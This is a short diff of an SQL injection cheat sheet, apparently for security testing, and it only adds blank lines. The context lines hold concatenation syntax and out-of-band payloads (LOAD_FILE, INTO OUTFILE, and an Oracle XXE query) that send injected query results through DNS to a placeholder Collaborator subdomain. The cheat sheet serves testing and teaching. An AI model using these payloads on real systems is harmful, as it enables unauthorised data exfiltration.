@@ -7,6 +7,7 @@ This SQL injection cheat sheet contains examples of useful syntax that you can u
 String concatenation
 You can concatenate together multiple strings to make a single string.
 
+
 Oracle	'foo'||'bar'
 Microsoft	'foo'+'bar'
 PostgreSQL	'foo'||'bar'
@@ -108,6 +109,7 @@ The following techniques work on Windows only:
 LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
 SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 DNS lookup with data exfiltration
+
 You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
 
 Oracle	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
